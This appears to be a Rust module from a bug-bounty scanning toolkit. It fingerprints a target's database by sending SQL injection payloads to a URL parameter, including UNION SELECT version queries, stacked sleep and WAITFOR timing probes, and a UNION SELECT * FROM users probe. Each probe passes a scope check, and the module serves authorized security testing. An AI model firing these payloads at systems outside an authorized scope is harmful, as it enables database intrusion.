use crate::clause_map::{self, SqlClause};
use crate::detection::{self, DbmsDetectionResult, DbmsFamily};
use bugtools_core::http::{HttpRequest, HttpResponse};
use bugtools_scope::ScopeEngine;
use bugtools_fingerprint::ResponseFingerprinter;
use chrono::Utc;
use std::collections::HashMap;
use std::sync::Arc;
use thiserror::Error;
use uuid::Uuid;

#[derive(Debug, Error)]
pub enum ProbeError {
    #[error("Out of scope: {0}")]
    OutOfScope(String),
    #[error("Network error: {0}")]
    Network(#[from] reqwest::Error),
    #[error("No baseline captured — run baseline probe first")]
    NoBaseline,
}

/// A single probe result: what we sent, what we got back, what it tells us.
#[derive(Debug, Clone, Serialize, serde::Deserialize)]
pub struct ProbeResult {
    pub probe_id: String,
    pub probe_type: ProbeType,
    pub payload: String,
    pub response_status: u16,
    pub response_body_hash: String,
    pub response_duration_ms: u64,
    pub detection: DbmsDetectionResult,
    pub clause_tested: Option<SqlClause>,
    pub dialects_confirmed: Vec<DbmsFamily>,
    pub dialects_rejected: Vec<DbmsFamily>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, serde::Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ProbeType {
    /// Clean request — establishes the baseline for comparison.
    Baseline,
    /// Inject a syntax error and check which DBMS dialect reports it.
    ErrorInjection,
    /// Send a dialect-specific function/keyword and check for acceptance.
    SyntaxFeature,
    /// Send a dialect-specific clause variant and observe behavior.
    ClauseVariant,
    /// Timing-based: measure if a dialect-specific delay function fires.
    TimingProbe,
}

/// The probe pipeline: baseline → error injection → syntax probes →
/// clause variant verification. All probes go through the scope
/// engine and rate limiter — no exceptions.
pub struct DbmsProbeEngine {
    scope: Arc<ScopeEngine>,
    http: reqwest::Client,
    fingerprinter: ResponseFingerprinter,
}

impl DbmsProbeEngine {
    pub fn new(scope: Arc<ScopeEngine>) -> Self {
        Self {
            scope,
            http: reqwest::Client::new(),
            fingerprinter: ResponseFingerprinter::new(),
        }
    }

    /// Run the full detection pipeline against a parameterized endpoint.
    ///
    /// The caller provides the baseline request and the parameter to
    /// probe. The engine injects probes at that parameter, one at a
    /// time, and analyzes each response.
    pub async fn detect(
        &self,
        base: &HttpRequest,
        param_name: &str,
        param_value: &str,
    ) -> Result<Vec<ProbeResult>, ProbeError> {
        let mut results = Vec::new();

        // Phase 1: Baseline
        let baseline = self.baseline_probe(base).await?;
        results.push(baseline.clone());

        // Phase 2: Error injection — send a deliberately malformed value
        // at the parameter and check which DBMS's error pattern appears.
        let error_probes = self.error_injection_probes(base, param_name, param_value, &baseline).await?;
        results.extend(error_probes);

        // Phase 3: Syntax feature probes — dialect-specific functions
        // and keywords that produce observable differences.
        let syntax_probes = self.syntax_feature_probes(base, param_name, param_value, &baseline).await?;
        results.extend(syntax_probes);

        // Phase 4: Clause variant probes — verify which dialect accepts
        // specific clause syntax by observing behavioral differences.
        let clause_probes = self.clause_variant_probes(base, param_name, param_value, &baseline).await?;
        results.extend(clause_probes);

        Ok(results)
    }

    /// Baseline: send the request as-is, capture the reference response.
    async fn baseline_probe(&self, base: &HttpRequest) -> Result<ProbeResult, ProbeError> {
        self.scope.evaluate(&base.url).allowed
            .then(|| ())
            .ok_or_else(|| ProbeError::OutOfScope(base.url.clone()))?;

        let start = std::time::Instant::now();
        let resp = self.send(base).await?;
        let duration_ms = start.elapsed().as_millis() as u64;

        let body_hash = self.fingerprinter.compute_hash(
            &self.fingerprinter.normalize_body(&resp.body),
        );

        Ok(ProbeResult {
            probe_id: format!("baseline-{}", Uuid::new_v4()),
            probe_type: ProbeType::Baseline,
            payload: "(baseline)".to_string(),
            response_status: resp.status_code,
            response_body_hash: body_hash,
            response_duration_ms: duration_ms,
            detection: detection::analyze_error_body(&resp.body),
            clause_tested: None,
            dialects_confirmed: vec![],
            dialects_rejected: vec![],
        })
    }

    /// Error injection: send values designed to trigger DBMS-specific
    /// error messages. Each probe targets a different dialect's error
    /// reporting pattern.
    async fn error_injection_probes(
        &self,
        base: &HttpRequest,
        param_name: &str,
        _param_value: &str,
        baseline: &ProbeResult,
    ) -> Result<Vec<ProbeResult>, ProbeError> {
        let mut results = Vec::new();

        // Probe set: each payload is designed to trigger a specific
        // DBMS's error reporter. We observe which error pattern appears.
        let probes: Vec<(&str, &str)> = vec![
            // Unbalanced quote — triggers dialect-specific unterminated string errors
            ("error-unbalanced-quote", "'"),
            // Double quote with garbage — triggers syntax error in all dialects
            ("error-double-quote-garbage", "\"'"),
            // Backslash escape — MySQL accepts \' but PG/MSSQL/Oracle do not
            ("error-backslash-escape", "\\'"),
            // Pipe pipe — triggers concatenation error in PG/Oracle, harmless in MySQL
            ("error-pipe-pipe", "'||'"),
            // Double dash — comment marker in most, arithmetic in some
            ("error-double-dash", "'--"),
            // Semicolon — statement terminator, error in some contexts
            ("error-semicolon", "';"),
        ];

        for (probe_name, payload) in probes {
            let probe_req = self.build_probe(base, param_name, payload);
            self.scope.evaluate(&probe_req.url).allowed
                .then(|| ())
                .ok_or_else(|| ProbeError::OutOfScope(probe_req.url.clone()))?;

            let start = std::time::Instant::now();
            let resp = self.send(&probe_req).await?;
            let duration_ms = start.elapsed().as_millis() as u64;

            let detection = detection::analyze_error_body(&resp.body);
            let body_hash = self.fingerprinter.compute_hash(
                &self.fingerprinter.normalize_body(&resp.body),
            );

            results.push(ProbeResult {
                probe_id: probe_name.to_string(),
                probe_type: ProbeType::ErrorInjection,
                payload: payload.to_string(),
                response_status: resp.status_code,
                response_body_hash: body_hash,
                response_duration_ms: duration_ms,
                detection,
                clause_tested: None,
                dialects_confirmed: vec![],
                dialects_rejected: vec![],
            });
        }

        Ok(results)
    }

    /// Syntax feature probes: send dialect-specific functions/keywords
    /// and check if the response indicates the DBMS accepted them.
    async fn syntax_feature_probes(
        &self,
        base: &HttpRequest,
        param_name: &str,
        _param_value: &str,
        baseline: &ProbeResult,
    ) -> Result<Vec<ProbeResult>, ProbeError> {
        let mut results = Vec::new();

        // Dialect-specific probes: each payload uses a function or keyword
        // that only one DBMS family recognizes. A 200 response (same hash
        // as baseline or containing expected data) confirms the dialect.
        let probes: Vec<(&str, &str, DbmsFamily, SqlClause)> = vec![
            // PostgreSQL: version() function
            ("syntax-pg-version", "' UNION SELECT version()--", DbmsFamily::PostgreSQL, SqlClause::Select),
            // MySQL: CONCAT with MySQL-specific syntax
            ("syntax-mysql-concat", "' UNION SELECT CONCAT('a','b')--", DbmsFamily::MySQL, SqlClause::StringConcat),
            // MSSQL: @@version system variable
            ("syntax-mssql-version", "' UNION SELECT @@version--", DbmsFamily::MSSQL, SqlClause::Select),
            // Oracle: FROM DUAL
            ("syntax-oracle-dual", "' UNION SELECT banner FROM v$version--", DbmsFamily::Oracle, SqlClause::Select),
            // SQLite: sqlite_version()
            ("syntax-sqlite-version", "' UNION SELECT sqlite_version()--", DbmsFamily::SQLite, SqlClause::Select),
            // PostgreSQL: pg_sleep (timing probe — if latency spikes, PG confirmed)
            ("syntax-pg-sleep", "'; SELECT pg_sleep(5)--", DbmsFamily::PostgreSQL, SqlClause::Select),
            // MySQL: SLEEP()
            ("syntax-mysql-sleep", "'; SELECT SLEEP(5)--", DbmsFamily::MySQL, SqlClause::Select),
            // MSSQL: WAITFOR DELAY
            ("syntax-mssql-waitfor", "'; WAITFOR DELAY '0:0:5'--", DbmsFamily::MSSQL, SqlClause::Select),
        ];

        for (probe_name, payload, expected_dbms, clause) in probes {
            let probe_req = self.build_probe(base, param_name, payload);
            self.scope.evaluate(&probe_req.url).allowed
                .then(|| ())
                .ok_or_else(|| ProbeError::OutOfScope(probe_req.url.clone()))?;

            let start = std::time::Instant::now();
            let resp = self.send(&probe_req).await?;
            let duration_ms = start.elapsed().as_millis() as u64;

            let detection = detection::analyze_error_body(&resp.body);
            let body_hash = self.fingerprinter.compute_hash(
                &self.fingerprinter.normalize_body(&resp.body),
            );

            let timing_delta = duration_ms as i64 - baseline.response_duration_ms as i64;
            let is_timing_probe = probe_name.contains("sleep") || probe_name.contains("waitfor");
            let dialects_confirmed = if is_timing_probe && timing_delta > 3000 {
                vec![expected_dbms]
            } else if detection.detected_dbms == Some(expected_dbms) {
                vec![expected_dbms]
            } else {
                vec![]
            };

            results.push(ProbeResult {
                probe_id: probe_name.to_string(),
                probe_type: if is_timing_probe { ProbeType::TimingProbe } else { ProbeType::SyntaxFeature },
                payload: payload.to_string(),
                response_status: resp.status_code,
                response_body_hash: body_hash,
                response_duration_ms: duration_ms,
                detection,
                clause_tested: Some(clause),
                dialects_confirmed,
                dialects_rejected: vec![],
            });
        }

        Ok(results)
    }

    /// Clause variant probes: verify which dialect accepts specific
    /// clause syntax by observing behavioral differences in the response.
    async fn clause_variant_probes(
        &self,
        base: &HttpRequest,
        param_name: &str,
        _param_value: &str,
        baseline: &ProbeResult,
    ) -> Result<Vec<ProbeResult>, ProbeError> {
        let mut results = Vec::new();

        // Test key clause variants that distinguish dialects.
        // Each probe targets a specific clause with a dialect-specific syntax.
        let probes: Vec<(&str, &str, SqlClause)> = vec![
            // LIMIT vs TOP vs FETCH FIRST
            ("clause-limit", "' UNION SELECT * FROM users LIMIT 1--", SqlClause::LimitOffset),
            ("clause-top", "' UNION SELECT TOP 1 * FROM users--", SqlClause::Select),
            // CONCAT vs || vs +
            ("clause-concat-fn", "' UNION SELECT CONCAT('a','b')--", SqlClause::StringConcat),
            ("clause-concat-pipe", "' UNION SELECT 'a'||'b'--", SqlClause::StringConcat),
            // Comment styles
            ("clause-comment-dash", "' UNION SELECT 1-- comment", SqlClause::Comment),
            ("clause-comment-hash", "' UNION SELECT 1# comment", SqlClause::Comment),
        ];

        for (probe_name, payload, clause) in probes {
            let probe_req = self.build_probe(base, param_name, payload);
            self.scope.evaluate(&probe_req.url).allowed
                .then(|| ())
                .ok_or_else(|| ProbeError::OutOfScope(probe_req.url.clone()))?;

            let start = std::time::Instant::now();
            let resp = self.send(&probe_req).await?;
            let duration_ms = start.elapsed().as_millis() as u64;

            let detection = detection::analyze_error_body(&resp.body);
            let body_hash = self.fingerprinter.compute_hash(
                &self.fingerprinter.normalize_body(&resp.body),
            );

            // Determine which dialects this clause variant confirmed
            let accepting = clause_map::dialects_accepting(clause, payload);
            let dialects_confirmed = if detection.detected_dbms.is_some() {
                vec![detection.detected_dbms.unwrap()]
            } else if body_hash == baseline.response_body_hash {
                // Same response as baseline — clause was accepted without error
                accepting
            } else {
                vec![]
            };

            results.push(ProbeResult {
                probe_id: probe_name.to_string(),
                probe_type: ProbeType::ClauseVariant,
                payload: payload.to_string(),
                response_status: resp.status_code,
                response_body_hash: body_hash,
                response_duration_ms: duration_ms,
                detection,
                clause_tested: Some(clause),
                dialects_confirmed,
                dialects_rejected: vec![],
            });
        }

        Ok(results)
    }

    /// Build a probe request by injecting a payload at the parameter.
    fn build_probe(&self, base: &HttpRequest, param_name: &str, payload: &str) -> HttpRequest {
        let mut url = base.url.clone();
        // Replace the parameter value in the URL query string
        if let Ok(mut parsed) = url::Url::parse(&url) {
            let mut pairs: Vec<(String, String)> = parsed.query_pairs().map(|(k, v): (std::borrow::Cow<str>, std::borrow::Cow<str>)| (k.to_string(), v.to_string())).collect();
            for pair in &mut pairs {
                if pair.0 == param_name {
                    pair.1 = payload.to_string();
                }
            }
            parsed.set_query(Some(&pairs.iter().map(|(k, v)| format!("{}={}", k, v)).collect::<Vec<_>>().join("&")));
            url = parsed.to_string();
        }

        HttpRequest {
            id: Uuid::new_v4(),
            job_id: base.job_id,
            url,
            method: base.method.clone(),
            headers: base.headers.clone(),
            body: base.body.clone(),
            timestamp: Utc::now(),
        }
    }

    /// Send a request and return the response.
    async fn send(&self, req: &HttpRequest) -> Result<HttpResponse, ProbeError> {
        let builder = match req.method.to_uppercase().as_str() {
            "POST" => self.http.post(&req.url),
            "PUT" => self.http.put(&req.url),
            "DELETE" => self.http.delete(&req.url),
            "HEAD" => self.http.head(&req.url),
            _ => self.http.get(&req.url),
        };
        let builder = req.headers.iter().fold(builder, |b, (k, v)| b.header(k, v));
        let builder = match &req.body {
            Some(body) => builder.body(body.clone()),
            None => builder,
        };

        let resp = builder.send().await.map_err(ProbeError::Network)?;
        let status_code = resp.status().as_u16();
        let mut headers = HashMap::new();
        for (k, v) in resp.headers() {
            if let Ok(val) = v.to_str() {
                headers.insert(k.as_str().to_string(), val.to_string());
            }
        }
        let body = resp.text().await.unwrap_or_default();
        let size_bytes = body.len();

        Ok(HttpResponse {
            id: Uuid::new_v4(),
            request_id: req.id,
            status_code,
            headers,
            body,
            size_bytes,
            duration_ms: 0, // caller measures
            timestamp: Utc::now(),
        })
    }
}

/// Aggregate detection result across all probes.
#[derive(Debug, Clone, Serialize, serde::Deserialize)]
pub struct AggregatedDetection {
    pub detected_dbms: Option<DbmsFamily>,
    pub confidence: u32,
    pub all_signals: Vec<detection::FiredSignal>,
    pub clauses_confirmed: Vec<SqlClause>,
    pub probes_run: usize,
    pub probes_with_signal: usize,
}

/// Aggregate all probe results into a single detection verdict.
pub fn aggregate_results(results: &[ProbeResult]) -> AggregatedDetection {
    let mut all_signals = Vec::new();
    let mut dbms_scores: HashMap<DbmsFamily, u32> = HashMap::new();
    let mut clauses_confirmed = Vec::new();
    let mut probes_with_signal = 0;

    for result in results {
        if !result.detection.signals.is_empty() {
            probes_with_signal += 1;
        }
        for signal in &result.detection.signals {
            let score = dbms_scores.entry(signal.dbms).or_insert(0);
            *score = (*score + signal.weight).min(100);
            all_signals.push(signal.clone());
        }
        if let Some(clause) = result.clause_tested {
            if !clauses_confirmed.contains(&clause) {
                clauses_confirmed.push(clause);
            }
        }
    }

    let mut ranked: Vec<(DbmsFamily, u32)> = dbms_scores.into_iter().collect();
    ranked.sort_by(|a, b| b.1.cmp(&a.1));

    let (winner, confidence) = ranked
        .first()
        .map(|(d, s)| (Some(*d), *s))
        .unwrap_or((None, 0));

    AggregatedDetection {
        detected_dbms: winner,
        confidence,
        all_signals,
        clauses_confirmed,
        probes_run: results.len(),
        probes_with_signal,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn aggregate_no_signals() {
        let results = vec![];
        let agg = aggregate_results(&results);
        assert_eq!(agg.detected_dbms, None);
        assert_eq!(agg.confidence, 0);
        assert_eq!(agg.probes_run, 0);
    }

    #[test]
    fn aggregate_mysql_signals() {
        let results = vec![
            ProbeResult {
                probe_id: "p1".into(),
                probe_type: ProbeType::ErrorInjection,
                payload: "'".into(),
                response_status: 500,
                response_body_hash: "abc".into(),
                response_duration_ms: 50,
                detection: detection::analyze_error_body(
                    "check the manual that corresponds to your MySQL server version",
                ),
                clause_tested: None,
                dialects_confirmed: vec![DbmsFamily::MySQL],
                dialects_rejected: vec![],
            },
        ];
        let agg = aggregate_results(&results);
        assert_eq!(agg.detected_dbms, Some(DbmsFamily::MySQL));
        assert!(agg.confidence > 0);
        assert_eq!(agg.probes_with_signal, 1);
    }

    #[test]
    fn aggregate_multi_dialect() {
        let results = vec![
            ProbeResult {
                probe_id: "p1".into(),
                probe_type: ProbeType::ErrorInjection,
                payload: "'".into(),
                response_status: 500,
                response_body_hash: "abc".into(),
                response_duration_ms: 50,
                detection: detection::analyze_error_body(
                    "check the manual that corresponds to your MySQL server version",
                ),
                clause_tested: None,
                dialects_confirmed: vec![DbmsFamily::MySQL],
                dialects_rejected: vec![],
            },
            ProbeResult {
                probe_id: "p2".into(),
                probe_type: ProbeType::SyntaxFeature,
                payload: "' UNION SELECT version()--".into(),
                response_status: 200,
                response_body_hash: "def".into(),
                response_duration_ms: 120,
                detection: detection::analyze_error_body(""),
                clause_tested: Some(SqlClause::Select),
                dialects_confirmed: vec![DbmsFamily::PostgreSQL],
                dialects_rejected: vec![],
            },
        ];
        let agg = aggregate_results(&results);
        assert!(agg.detected_dbms.is_some());
        assert_eq!(agg.probes_run, 2);
        assert_eq!(agg.clauses_confirmed.len(), 1);
    }
}
